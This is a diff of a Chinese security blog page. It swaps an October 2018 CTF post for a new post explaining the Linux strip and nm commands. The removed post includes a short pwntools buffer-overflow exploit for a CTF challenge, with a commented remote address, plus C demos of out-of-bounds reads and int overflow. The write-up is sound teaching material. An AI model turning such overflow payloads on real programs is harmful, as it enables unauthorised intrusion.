@@ -249,13 +249,13 @@
 
 
 
-<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
+<div class="bg-cover post-cover" style="background-image: url('https://i.loli.net/2018/10/16/5bc55817b7dd3.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        Pwn-10月
+                        Pwn-10月17-strip
                     </div>
                 </div>
             </div>
@@ -345,6 +345,10 @@
                     <span class="chip bg-color">Pwn</span>
                 </a>
                 
+                <a href="/tags/linux/" target="_blank">
+                    <span class="chip bg-color">linux</span>
+                </a>
+                
             </div>
             
             <div class="post-info">
@@ -360,7 +364,7 @@
                 
 
                 <span class="post-date">
-                    <i class="fa fa-clock-o fa-fw"></i>2018-10-13
+                    <i class="fa fa-clock-o fa-fw"></i>2018-10-17
                 </span>
             </div>
         </div>
@@ -368,94 +372,17 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <p>[TOC]</p>
-<h1 id="Pwn-10-13"><a href="#Pwn-10-13" class="headerlink" title="Pwn-10/13"></a>Pwn-10/13</h1><blockquote>
-<p>​    今天打了护网杯，从之前的强网杯，到国赛，到铁三，到Xman，再到网鼎杯，最后到了今天的护网杯，经历的比赛倒是挺多，只是进步微乎其微，实在汗颜，希望接下来能有较大的进步！</p>
-<p>​    write-up友链：<a href="https://supery4ng.github.io/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AFWP/" target="_blank" rel="noopener">https://supery4ng.github.io/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AFWP/</a></p>
-<p>​    护网杯关键词：<code>python tornado模板注入(STTI)</code>,<code>条件竞争</code>,<code>辣条</code>,<code>溢出</code>,<code>自闭</code></p>
-</blockquote>
-<h2 id="gettingstart"><a href="#gettingstart" class="headerlink" title="gettingstart"></a>gettingstart</h2><blockquote>
-<p>​    这相当于今天pwn的签到题，简单但详细地复原一下：</p>
-<p>​    第一步，IDA看一看，逻辑十分简单，甚至可以直接写payload：</p>
-<p><img src="https://i.loli.net/2018/10/13/5bc20e49c32cb.png" alt=""></p>
-<p>​    突破点是通过read函数，在buf处进行溢出，进而覆盖v7，v8的值，达到else的条件，即v7==0x7FFFFFFFFFFFFFFF,v8==0.1。</p>
-<p>​    这里我们需要知道的是，浮点数在内存中表现的形式是什么样子的，它与普通的整型不同，会做出转换，比较晦涩。这里简单写一个C语言程序看看0.1是怎么表示的：</p>
-<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
-
-<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-        <span class="token keyword">double</span> a<span class="token operator">=</span><span class="token number">0.1</span><span class="token punctuation">;</span>
-        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%lf"</span><span class="token punctuation">,</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-</code></pre>
-<p>​    通过<code>gcc -o test test.c -z noexecstack -no-pie</code>进行编译，然后使用gdb看看：</p>
-<p><img src="https://i.loli.net/2018/10/13/5bc213eed9cfc.png" alt=""></p>
-<p>​    显而易见，0.1是用0x3fb999999999999a表示的，那么在接下来的exp中就应该这样写:</p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./task"</span><span class="token punctuation">)</span>
-<span class="token comment" spellcheck="true">#p=remote("117.78.26.114",31498)</span>
-payload<span class="token operator">=</span><span class="token string">""</span>
-payload<span class="token operator">+=</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token number">24</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x7FFFFFFFFFFFFFFF</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x3FB999999999999A</span><span class="token punctuation">)</span>
-<span class="token comment" spellcheck="true">#cmd="cat flag"</span>
-<span class="token comment" spellcheck="true">#print p.recv()</span>
-<span class="token comment" spellcheck="true">#print payload</span>
-p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-<span class="token keyword">print</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token comment" spellcheck="true">#p.send(cmd)</span>
-p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token comment" spellcheck="true">#print p.recv()</span>
-</code></pre>
-<p>运行exp，效果图：</p>
-<p><img src="https://i.loli.net/2018/10/13/5bc214f6668a4.png" alt=""></p>
-</blockquote>
-<h2 id="验证数组越界"><a href="#验证数组越界" class="headerlink" title="验证数组越界"></a>验证数组越界</h2><blockquote>
-<p>​    写一段简单的代码来验证一下，新生经常会犯错的数组越界问题</p>
-<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
-
-<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-
-        <span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-        a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
-        a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
-        a<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>
-        a<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">;</span>
-
-        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-
-</code></pre>
-<p>​    运行结果：</p>
-<p><img src="https://i.loli.net/2018/10/14/5bc299e356904.png" alt=""></p>
-<p>​    因为a[4]并不在我们定义的数组范围，属于数组越界，接下来调试一下看看具体情况：</p>
-<p><img src="https://i.loli.net/2018/10/14/5bc2998608bee.png" alt=""></p>
-<p>​    而就在0，1，2，3后面是不是我们运行输出的那个值呢？正是如此，因为我们通过a[4]访问的并不是我们曾经定义过的元素，而是程序运行中的产生的随机值，如函数地址等。</p>
-</blockquote>
-<h2 id="验证int溢出"><a href="#验证int溢出" class="headerlink" title="验证int溢出"></a>验证int溢出</h2><blockquote>
-<p>​    在64位系统中 <code>int</code>型变量是占用4个字节大小的，而4个字节用16进制表示就是<code>0x00000000-0xffffffff</code>，并且正数负数都在其中，而负数是用补码表示的，<code>0x7fffffff&lt;=&gt;2147483647</code>，<code>0x80000000=2147483648&lt;=&gt;-2147483648</code>。</p>
-<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
-
-<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-        <span class="token keyword">int</span> i<span class="token punctuation">;</span>
-        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"四个字节最大值0x7fffffff十进制为:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span><span class="token number">0x7fffffff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入你想要赋给int的值:\n"</span><span class="token punctuation">)</span>
-        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-
-</code></pre>
-<p>运行结果：</p>
-<p><img src="https://i.loli.net/2018/10/14/5bc29c77aa16d.png" alt=""></p>
-<p>​    果不其然，我们赋给int的2147483648变成了负数，-2147483648。</p>
-<p><img src="https://i.loli.net/2018/10/14/5bc29d54a35a3.png" alt=""></p>
-</blockquote>
-<blockquote>
-<p>have a good weekend everybody!</p>
+<h1 id="Pwn-10月17-strip"><a href="#Pwn-10月17-strip" class="headerlink" title="Pwn-10月17-strip"></a>Pwn-10月17-strip</h1><blockquote>
+<p>strip是linux下的一个命令，用于给特定文件消除，剥离一些符号信息和调试信息，通常被叫做“脱衣服”，可以减小可执行文件的体积，又不影响其运行，但是当这种程序出现在二进制分析中就比较麻烦了，因为用strip命令处理过的程序，反编译可能会比较混乱，有时候也需要恢复符号表来完成分析。</p>
+<p>简单编译一个test.c文件，脱脱衣服试试：</p>
+<p><img src="https://i.loli.net/2018/10/17/5bc759646ed19.png" alt=""></p>
+<p>可以看到编译后的test文件信息，not stripped，这里再用到linux下的nm命令，是names的缩写，能够列出文件的符号值，函数和全局变量等信息，更官方一点的就是这样的解释：<code>nm工具列出.o文件、.a文件、.so文件等的符号信息，包括诸如符号的值，符号类型及符号名称等。所谓符号，通常指定义出的函数，全局变量等等。</code>。</p>
+<p><img src="https://i.loli.net/2018/10/17/5bc75a09ec273.png" alt=""></p>
+<p>像 hacklu2018的一个题，就是脱了衣服的，没有符号表：</p>
+<p><img src="https://i.loli.net/2018/10/17/5bc75aa3b1afa.png" alt=""></p>
+<p>那么给test文件脱一下试试：</p>
+<p><img src="https://i.loli.net/2018/10/17/5bc75ae6dcb39.png" alt=""></p>
+<p>可以看到符号表已经被脱下，并且不影响正常运行。</p>
 </blockquote>
 
             </div>
@@ -595,7 +522,7 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
                     <span class="reprint-tip">转载请注明: </span>
                     <a href="http://www.yof3ng.xyz" class="b-link-green">Yof3ng's Blog | 热爱分享</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2018/10/13/Pwn-10月/" class="b-link-green">Pwn-10月</a>
+                    <a href="/2018/10/17/Pwn-10月17-strip/" class="b-link-green">Pwn-10月17-strip</a>
                 </p>
             </div>
         </div>
@@ -617,7 +544,7 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
         repo: 'yof3ng.github.io',
         owner: 'Yof3ng',
         admin: "Yof3ng",
-        id: '2018-10-13T23-05-58',
+        id: '2018-10-17T23-27-29',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -634,42 +561,47 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge left-badge text-color">上一篇</div>
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">本篇</div>
             <div class="card">
-                <a href="/2018/10/14/2017APT报告研读/">
+                <a href="/2018/10/17/Pwn-10月17-strip/">
                     <div class="card-image">
                         
-                        <img src="https://i.loli.net/2018/10/14/5bc2c4e0cff6e.jpg" class="responsive-img" alt="2017APT报告研读">
+                        <img src="https://i.loli.net/2018/10/16/5bc55817b7dd3.jpg" class="responsive-img" alt="Pwn-10月17-strip">
                         
-                        <span class="card-title">2017APT报告研读</span>
+                        <span class="card-title">Pwn-10月17-strip</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary">[TOC]
-2017 APT 报告研读APT 与网络战争中的大国博弈
-&nbsp; &nbsp; &nbsp; &nbsp; 为什么对APT方面的研究让美国，让中国，让世界各国开始重视起来？据数据，2017年遭受APT攻击最多的国家依次是：</div>
+Pwn-10月17-strip
+strip是linux下的一个命令，用于给特定文件消除，剥离一些符号信息和调试信息，通常被叫做“脱衣服”，可以减小可执行文件的体积，又不影响其运行，但是当这种程序出现在二进制分析中就比较麻烦了，因</div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2018-10-14
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2018-10-17
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/杂文/" class="post-category" target="_blank">
-                                    杂文
+                            <a href="/categories/CTF/" class="post-category" target="_blank">
+                                    CTF
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/APT/" target="_blank">
-                        <span class="chip bg-color">APT</span>
+                    <a href="/tags/Pwn/" target="_blank">
+                        <span class="chip bg-color">Pwn</span>
+                    </a>
+                    
+                    <a href="/tags/linux/" target="_blank">
+                        <span class="chip bg-color">linux</span>
                     </a>
                     
                 </div>
@@ -681,24 +613,21 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">下一篇</div>
             <div class="card">
-                <a href="/2018/10/13/数学建模-day5/">
+                <a href="/2018/10/17/数学建模-day6/">
                     <div class="card-image">
                         
-                        <img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1540039782&amp;di=1f2a7693a843ded05cbe3be4abc5c6ef&amp;imgtype=jpg&amp;er=1&amp;src=http%3A%2F%2Fg.hiphotos.baidu.com%2Fbaike%2Fc0%253Dbaike60%252C5%252C5%252C60%252C20%253Bt%253Dgif%2Fsign%3De731d2d8972bd40756cadbaf1ae0f534%2Fb3119313b07eca808b2d7517912397dda1448312.jpg" class="responsive-img" alt="数学建模-day5">
+                        <img src="https://i.loli.net/2018/10/17/5bc71d6db996b.png" class="responsive-img" alt="数学建模-day6">
                         
-                        <span class="card-title">数学建模-day5</span>
+                        <span class="card-title">数学建模-day6</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary">[TOC]
-数学建模_day5 - 线性代数
-​    线性代数相信大家都学过哒，基本是大学的理科必修课，而线性代数常用于工程数学，自然而然就和数学建模有很大的关系啦，今天学习一下用matlab做一些相关的线性代数学习。
-
-矩阵
-​    </div>
+数学建模-day6 - 遗传算法
+算法都是用来解决实际问题，提高效率的，而学好算法对一个信息安全从业者来说，应该也是必要的。开始接触这些算法，也逐渐意识到知识面广阔的重要，比如遗传算法就需要知道一定的生物知识，可能这就是培训机构</div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2018-10-13
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2018-10-17
                             </span>
                         <span class="publish-author">
                             
@@ -715,8 +644,16 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/数模/" target="_blank">
-                        <span class="chip bg-color">数模</span>
+                    <a href="/tags/数学建模/" target="_blank">
+                        <span class="chip bg-color">数学建模</span>
+                    </a>
+                    
+                    <a href="/tags/算法/" target="_blank">
+                        <span class="chip bg-color">算法</span>
+                    </a>
+                    
+                    <a href="/tags/algorithm/" target="_blank">
+                        <span class="chip bg-color">algorithm</span>
                     </a>
                     
                 </div>
@@ -732,7 +669,7 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
         <div class="toc-widget">
             <h4>目录</h4>
             <div id="toc-content">
-                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Pwn-10-13"><span class="post-toc-text">Pwn-10/13</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#gettingstart"><span class="post-toc-text">gettingstart</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#验证数组越界"><span class="post-toc-text">验证数组越界</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#验证int溢出"><span class="post-toc-text">验证int溢出</span></a></li></ol></li></ol>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Pwn-10月17-strip"><span class="post-toc-text">Pwn-10月17-strip</span></a></li></ol>
             </div>
         </div>
     </div>
@@ -868,5 +805,5 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
 <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
 <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
 <script type="text/javascript" src="/js/fireworks.js"></script>
-<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":140,"height":260},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":100,"height":170},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 </html>
